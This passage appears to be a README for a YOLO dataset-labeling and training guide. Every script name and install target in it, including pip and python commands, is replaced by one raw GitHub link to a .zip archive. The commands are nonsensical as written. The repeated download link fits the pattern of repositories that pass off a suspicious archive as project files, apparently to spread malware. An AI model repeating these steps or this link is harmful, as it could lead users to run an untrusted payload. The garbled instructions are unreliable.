   In the Command Prompt or Terminal, navigate to the folder where you downloaded the files. Use the following command to install the necessary libraries:

   ```
   pip install -r https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Training-YOL-Preparation-Labeling-Environment-Setup-Guide-1.7.zip
   ```

4. **Verify Installation:** Run this command to check if everything installed correctly:

   ```
   python -m pip list
   ```

5. **Load Sample Data:** Use the provided scripts to load the example data and start experimenting.

## 📝 Labeling Your Data

Using the provided scripts, you can label your dataset easily:

1. Open the `scripts/` folder.
2. Find the labeling script named `https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Training-YOL-Preparation-Labeling-Environment-Setup-Guide-1.7.zip`.
3. Run it using:

   ```
   python https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Training-YOL-Preparation-Labeling-Environment-Setup-Guide-1.7.zip
   ```

4. Follow the on-screen instructions to label your objects.

## 📊 Training Your YOLO Model

Once your data is labeled, you can train the YOLO model:

1. Navigate to the `scripts/` folder again.
2. Run the training script named `https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Training-YOL-Preparation-Labeling-Environment-Setup-Guide-1.7.zip` with:

   ```
   python https://raw.githubusercontent.com/danixssj/Dataset-Preparation-Labeling-Environment-Setup-YOLO-Training-Guide/main/notommatid/Dataset-Training-YOL-Preparation-Labeling-Environment-Setup-Guide-1.7.zip
   ```
